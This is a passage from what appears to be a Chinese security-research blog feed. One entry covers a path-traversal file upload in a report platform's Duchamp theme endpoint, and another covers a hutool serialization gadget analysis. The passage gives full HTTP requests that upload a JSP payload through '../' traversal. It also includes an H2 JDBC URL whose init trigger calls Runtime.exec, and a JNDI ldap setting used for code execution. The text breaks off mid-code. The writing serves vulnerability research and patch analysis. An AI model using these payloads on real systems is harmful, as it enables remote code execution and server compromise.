alt="image-20241103152935451"></p><p>&#x2F;webroot&#x2F;decision&#x2F;view&#x2F;duchamp&#x2F;theme&#x2F;list</p><p>&#x2F;webroot&#x2F;decision&#x2F;view&#x2F;duchamp&#x2F;theme&#x2F;resource2template</p><p>webroot&#x2F;decision&#x2F;view&#x2F;duchamp&#x2F;theme&#x2F;attach?<strong>id</strong>&#x3D;<strong>98f6460e-2334-47a7-1081-72a7bd391e56</strong>&amp;<strong>attachID</strong>&#x3D;<strong>3</strong>&amp;<strong>metadata</strong>&#x3D;<strong>%7b%22%6e%61%6d%65%22%3a%22%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%73%6b%2e%6a%73%70%22%7d</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/webroot/decision/view/duchamp/theme/attach?id=98f6460e-2334-47a7-1081-72a7bd391e56&amp;attachID=3&amp;metadata=%7b%22%6e%61%6d%65%22%3a%22%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%73%6b%2e%6a%73%70%22%7d</span>  <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> <br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Charset</span><span class="hljs-punctuation">: </span>GBK,utf-8;q=0.7,*;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>294<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=c6c05c9386d544159462cae057c4a758<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0<br><br><span class="language-pgsql"><span class="hljs-comment">--c6c05c9386d544159462cae057c4a758</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;test.txt&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;% <span class="hljs-keyword">out</span>.println(<span class="hljs-number">11809</span>+<span class="hljs-number">76625</span>+&quot;FNjzadubmSaGkeSF&quot;);<span class="hljs-built_in">new</span> java.io.File(application.getRealPath(request.getServletPath())).<span class="hljs-keyword">delete</span>();%&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">--c6c05c9386d544159462cae057c4a758--</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/webroot/decision/view/duchamp/theme/resource2template</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Charset</span><span class="hljs-punctuation">: </span>GBK, utf-8;q=0.7, *;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN, zh;q=0.8<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>67<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0<br><br><span class="language-prolog">&#123;<span class="hljs-string">&quot;attachIDs&quot;</span>: [<span class="hljs-string">&quot;3&quot;</span>], <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;98f6460e-2334-47a7-1081-72a7bd391e56&quot;</span>, <span class="hljs-string">&quot;reuseIDs&quot;</span>: [<span class="hljs-string">&quot;&quot;</span>], <span class="hljs-string">&quot;tplPath&quot;</span>: <span class="hljs-string">&quot;&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/webroot/decision/view/duchamp/theme/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Charset</span><span class="hljs-punctuation">: </span>GBK, utf-8;q=0.7, *;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN, zh;q=0.8<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0<br><br></code></pre></td></tr></table></figure><h3 id="0x04-修复方式"><a href="#0x04-修复方式" class="headerlink" title="0x04 修复方式"></a>0x04 修复方式</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">uploadTemplateStyleAttach</span><br></code></pre></td></tr></table></figure><p><img src="image-20241202022900939.png" alt="image-20241202022900939"></p><p>添加一个新函数来判断</p><p>可以看到先读入文件流，然后调用进行判断</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">DuchampResourceRequestHelper<span class="hljs-selector-class">.checkFileValid</span>(bufferedInputStream, parseResult<span class="hljs-selector-class">.getFileExtension</span>()))<br></code></pre></td></tr></table></figure><p><img src="image-20241202023217135.png" alt="image-20241202023217135"></p><p><img src="image-20241202023243195.png" alt="image-20241202023243195"></p><p><img src="image-20241202023626927.png" alt="image-20241202023626927"></p><p>可以看到主要就两个方法，一个是从 FILE_HEADER_MAGIC_NUMBER获取，获取到就去判断文件头magicNumber，一样就返回true,不一样就返回false。还有一个没有在FILE_HEADER_MAGIC_NUMBER获取到的值，就去FILE_HEADER_WHITE_LIST里面找，找到就是true，找不到就是false。</p><p><img src="image-20241202023759699.png" alt="image-20241202023759699"></p><p>对应的后缀以及魔术头。以及白名单后缀。</p><p>从上面逻辑可以看到，没什么用，控制文件写入的后缀是metadata中的name。不是在文件流中的后缀，所以我们直接使用白名单的后缀进行绕过就可以完成这里的修复。</p><p>写入点</p><p><img src="image-20241202025454333.png" alt="image-20241202025454333"></p><p><img src="image-20241202025603049.png" alt="image-20241202025603049"></p><p><img src="image-20241202025534097.png" alt="image-20241202025534097"></p><p>检查了..&#x2F;..&#x2F;，匹配到就报错。</p><p><img src="image-20241202025758325.png" alt="image-20241202025758325"></p><p><img src="image-20241202025827575.png" alt="image-20241202025827575"></p><p>后面还对后缀进行了判断，匹配到就报错</p><p><img src="image-20241202025917246.png" alt="image-20241202025917246"></p><p>也就是我们可以绕过第一步，第二步是绕过不了的，新版还是认证后才能访问，看起来没什么继续研究的必要了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bes spark分析’</title>
    <link href="/2024/12/02/spark%E5%88%86%E6%9E%90%E2%80%99/"/>
    <url>/2024/12/02/spark%E5%88%86%E6%9E%90%E2%80%99/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4aaf0bccc046e7d6ef92224a1e51787a6ee70ef1deb3f49d25b664b0ae704db6">8818241407cb3eae07fa02969ff244ed68918f7e15271db37b9a8811e1b0d36c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hutool序列化分析及gadget浅析</title>
    <link href="/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/"/>
    <url>/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p><code>Hutool</code>是一个功能丰富且易用的<strong>Java工具库</strong>，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。github地址 <a href="https://github.com/dromara/hutool">https://github.com/dromara/hutool</a></p><h3 id="0x02-测试demo"><a href="#0x02-测试demo" class="headerlink" title="0x02 测试demo"></a>0x02 测试demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.utils.utils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jacksonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span>  &#123;<br>        <span class="hljs-type">int</span> code;<br>        String detail;<br>        Object data;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCode</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;setCode&quot;</span>);<br>            <span class="hljs-built_in">this</span>.code = code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDetail</span><span class="hljs-params">(String detail)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;setdetail&quot;</span>);<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(Object data)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;setdata&quot;</span>);<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getCode&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDetail</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDetail&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            System.out.println(<span class="hljs-string">&quot;getData&quot;</span>);<br><span class="hljs-comment">//            java.lang.Runtime.getRuntime().exec(&quot;open .&quot;);</span><br>            System.out.println(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail, Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();<br>        utils.setFieldValue(message, <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-number">1</span>);<br>        utils.setFieldValue(message, <span class="hljs-string">&quot;detail&quot;</span>, <span class="hljs-string">&quot;hello world&quot;</span>);<br>        utils.setFieldValue(message, <span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>);<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><span class="hljs-comment">//        String s = objectMapper.writeValueAsString(message);</span><br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        entries.put(<span class="hljs-string">&quot;code&quot;</span>, message);<br><span class="hljs-comment">//        com.alibaba.fastjson.JSON.toJSONString(message);</span><br><br><br><span class="hljs-comment">//        System.out.println(&quot;1&quot;);</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里编写一个demo(以前复制的，不知道是从枫还是木头大哥哪里复制的)，来测试用hutool的时候，javabean的触发方式 。</p><p><img src="image-20241125154655056.png" alt="image-20241125154655056"></p><p>这里看到在使用hutool，json序列化的时候是能触发javabean的getter方法的。所以是不是也可以和jackson或者fastjson一样用来做gadget了？</p><h3 id="0x03-序列化分析"><a href="#0x03-序列化分析" class="headerlink" title="0x03 序列化分析"></a>0x03 序列化分析</h3><p>这里在Message类中，随便找一个getter下断点，进行分析</p><p><img src="image-20241125155050616.png" alt="image-20241125155050616"></p><p>完整调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">getData:<span class="hljs-number">42</span>, jacksonTest$Message (com.jsonser)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invokeRaw:<span class="hljs-number">1085</span>, ReflectUtil (cn.hutool.core.util)<br>invoke:<span class="hljs-number">1016</span>, ReflectUtil (cn.hutool.core.util)<br>getValue:<span class="hljs-number">155</span>, PropDesc (cn.hutool.core.bean)<br>lambda$copy$<span class="hljs-number">0</span>:<span class="hljs-number">66</span>, BeanToMapCopier (cn.hutool.core.bean.copier)<br>accept:-<span class="hljs-number">1</span>, <span class="hljs-number">1826699684</span> (cn.hutool.core.bean.copier.BeanToMapCopier$$Lambda$<span class="hljs-number">13</span>)<br>forEach:<span class="hljs-number">676</span>, LinkedHashMap (java.util)<br>copy:<span class="hljs-number">48</span>, BeanToMapCopier (cn.hutool.core.bean.copier)<br>copy:<span class="hljs-number">16</span>, BeanToMapCopier (cn.hutool.core.bean.copier)<br>copy:<span class="hljs-number">92</span>, BeanCopier (cn.hutool.core.bean.copier)<br>beanToMap:<span class="hljs-number">737</span>, BeanUtil (cn.hutool.core.bean)<br>mapFromBean:<span class="hljs-number">264</span>, ObjectMapper (cn.hutool.json)<br>map:<span class="hljs-number">114</span>, ObjectMapper (cn.hutool.json)<br>&lt;init&gt;:<span class="hljs-number">210</span>, JSONObject (cn.hutool.json)<br>&lt;init&gt;:<span class="hljs-number">187</span>, JSONObject (cn.hutool.json)<br>wrap:<span class="hljs-number">811</span>, JSONUtil (cn.hutool.json)<br>set:<span class="hljs-number">393</span>, JSONObject (cn.hutool.json)<br>set:<span class="hljs-number">352</span>, JSONObject (cn.hutool.json)<br>put:<span class="hljs-number">340</span>, JSONObject (cn.hutool.json)<br>main:<span class="hljs-number">70</span>, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>JsonArray类似，都是走JSONUtil.wrap。 那我们直接来看</p><p>cn.hutool.json.JSONUtil#wrap</p><p><img src="image-20241125155419991.png" alt="image-20241125155419991"></p><p>这里主要就是判断我们在JSONObject.put进来的对象的原始类型是不是这几个类型。</p><p>我们穿的对象，肯定是不符合上面的几个原始类型，直接看这一行就好。</p><p><img src="image-20241125155728295.png" alt="image-20241125155728295"></p><p>看到这里有个判断cn.hutool.core.util.ClassUtil#isJdkClass</p><p><img src="image-20241125155818338.png" alt="image-20241125155818338"></p><p>它会判断我们序列化的类是不是jdk的原始类。这里最强的就是clazz.getClassLoader()，我们知道jdk类是不在classload上下文中，这条判断相当于绝杀了。直接把jdbcrow，tempalte，LdapAttribute, SignedObject 等直接杀掉了。这些gadgegt尾巴相当于全部gg。</p><p>是jdk类就直接返回obj.tostrng。不是就实例化一个JSONObject对象</p><p>实例化会调用</p><p>cn.hutool.json.JSONObject#JSONObject(java.lang.Object, cn.hutool.json.JSONConfig, cn.hutool.core.lang.Filter&lt;cn.hutool.core.lang.mutable.MutablePair&lt;java.lang.String,java.lang.Object&gt;&gt;)</p><p><img src="image-20241125161631577.png" alt="image-20241125161631577"></p><p>cn.hutool.json.ObjectMapper#map(cn.hutool.json.JSONObject, cn.hutool.core.lang.Filter&lt;cn.hutool.core.lang.mutable.MutablePair&lt;java.lang.String,java.lang.Object&gt;&gt;)</p><p><img src="image-20241125163650836.png" alt="image-20241125163650836"></p><p>这里就是获取serializer，我们是希望做gadget的，这里肯定都不符合，直接看最后面就好</p><p><img src="image-20241125163742722.png" alt="image-20241125163742722"></p><p><img src="image-20241125163824333.png" alt="image-20241125163824333"></p><p><img src="image-20241125163910646.png" alt="image-20241125163910646"></p><p><img src="image-20241125163924346.png" alt="image-20241125163924346"></p><p>主要判断有没有getter方法，以及fied是不是public。 显然我们肯定是符合的。</p><p>就是就是触发bean到map的过程。</p><p><img src="image-20241125164223418.png" alt="image-20241125164223418"></p><p>主要就是这个copy方，它会调用下面这个方法。</p><p>cn.hutool.core.bean.copier.BeanToMapCopier#copy</p><p><img src="image-20241125164544382.png" alt="image-20241125164544382"></p><p><img src="image-20241125164707597.png" alt="image-20241125164707597"></p><p>它会获取我们传入类的fied，以及对应的getter，setter方法。</p><p>最最最最坑的地方到了</p><p>cn.hutool.core.bean.PropDesc#isReadable</p><p><img src="image-20241125165018000.png" alt="image-20241125165018000"></p><p>它会调用这个傻逼方法判断这个fied是不是public，有没有对应的getter方法,还判断了fied是不是TRANSIENT修饰，超级无语了，进不去就触发不了getter。</p><p>如果幸运走到里面，那么就来到触发点了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">sDesc.getValue<br></code></pre></td></tr></table></figure><p><img src="image-20241125165249895.png" alt="image-20241125165249895"></p><p><img src="image-20241125165323841.png" alt="image-20241125165323841"></p><p>无参数getter方法。</p><p>已上感觉，就是限制的太死了，暂时想不到能用hutool做gadget去触发getter。太难了，主要这傻逼是fied的前面加get，还有public，说实话很难利用。</p><h3 id="0x04-测试demo"><a href="#0x04-测试demo" class="headerlink" title="0x04 测试demo"></a>0x04 测试demo</h3><p>其实通过以上分析，不让发现触发点事new JSONObject，这样就可以绕调限制原生jdk的类了。</p><h4 id="template"><a href="#template" class="headerlink" title="template"></a>template</h4><p>直接写一个template测试</p><p><img src="image-20241125165924271.png" alt="image-20241125165924271"></p><p><img src="image-20241125170054145.png" alt="image-20241125170054145"></p><p>来到 BeanUtil.getBeanDesc(actualEditable).getPropMap(this.copyOptions.ignoreCase)</p><p>可以看到获取template所有fied，但是这些fied是有没有对应的setter，getter方法<img src="image-20241125170223657.png" alt="image-20241125170223657"></p><p>)</p><p><img src="image-20241125170433728.png" alt="image-20241125170433728"></p><p>然后最绝望的是都是private, 且没后propdesc描述，过不了判断。 根本无法用来组gadget。</p><h4 id="LdapAttribute"><a href="#LdapAttribute" class="headerlink" title="LdapAttribute"></a>LdapAttribute</h4><p><img src="image-20241125171325587.png" alt="image-20241125171325587"></p><p>在来个列子</p><p><img src="image-20241125171356632.png" alt="image-20241125171356632"></p><p>可以看到，他获取到了是当前类和父类的fied，然后获取propdesc。 并没有获取到getAttributeSyntaxDefinition, 没有这个fied，真是够绝望。</p><h4 id="cn-hutool-db-ds-DSFactory"><a href="#cn-hutool-db-ds-DSFactory" class="headerlink" title="cn.hutool.db.ds.DSFactory"></a>cn.hutool.db.ds.DSFactory</h4><p>目前最有希望的就是这个</p><p><img src="image-20241125172920415.png" alt="image-20241125172920415"></p><p><img src="image-20241125172948428.png" alt="image-20241125172948428"></p><p>可是这里获取不到getter方法，没有对应的propdesc描述，真的无语，</p><p><img src="image-20241125173044585.png" alt="image-20241125173044585"></p><p>不知道为什么获取不到，真的傻逼。因为没有对应的getter方法，以及dataSourceName是protected，导致过不了isReadable的判断。</p><p>无法走到sDesc.getValue(this.source)</p><p><img src="image-20241125174618090.png" alt="image-20241125174618090"></p><p>最后打计算器模拟走进去，是能正常触发的。以上，what can i say</p><p>总结，要想利用成功，需要触发getter调用的方法有对应的fied，fied不能TRANSIENT修饰，且有propdesc描述，采用调用的希望。</p><h3 id="0x05-hutool-gadget"><a href="#0x05-hutool-gadget" class="headerlink" title="0x05 hutool gadget"></a>0x05 hutool gadget</h3><p>cn.hutool.db.ds.DSFactory</p><p><img src="image-20241125174859482.png" alt="image-20241125174859482"></p><p>它会调用getDataSource，看他的实现类</p><p>cn.hutool.db.ds.AbstractDSFactory#getDataSource</p><p><img src="image-20241125175021881.png" alt="image-20241125175021881"></p><p>创建jdbc连接</p><p>他是一个抽象类，看一下实现</p><p><img src="image-20241125175048477.png" alt="image-20241125175048477"></p><p>这里有9个，其中6类需要系统有依赖才能使用，<img src="image-20241125175138760.png" alt="image-20241125175138760"></p><p>应该构造函数会调用。</p><p>在只有hutool的情况下，我们可以使用这三个类进行处罚jdbc&#x2F;jndi 攻击</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">DSFactory DSFactory;<br> DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDSFactory</span>(setting);<br> DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PooledDSFactory</span>(setting);<br>DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JndiDSFactory</span>(setting);<br></code></pre></td></tr></table></figure><p><img src="image-20241125175341607.png" alt="image-20241125175341607"></p><p>他们都需要传一个seting进行构造</p><p><img src="image-20241125175607923.png" alt="image-20241125175607923"></p><p>我们只要配置jdbcurl就行。</p><p><img src="image-20241125175648313.png" alt="image-20241125175648313"></p><p>在使用JndiDSFactory要配置jndi。</p><p>最后构造就是如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>        <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>        <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -a Calculator&#x27;)\n&quot;</span> +<br>        <span class="hljs-string">&quot;$$\n&quot;</span>;<br><span class="hljs-type">Setting</span> <span class="hljs-variable">setting</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Setting</span>();<br>setting.setCharset(<span class="hljs-literal">null</span>);<br>setting.set(<span class="hljs-string">&quot;url&quot;</span>, JDBC_URL);<br>setting.set(<span class="hljs-string">&quot;jndi&quot;</span>, <span class="hljs-string">&quot;ldap://127.0.0.1:80/Object&quot;</span>);<br>DSFactory DSFactory;<br> DSFactory = <span 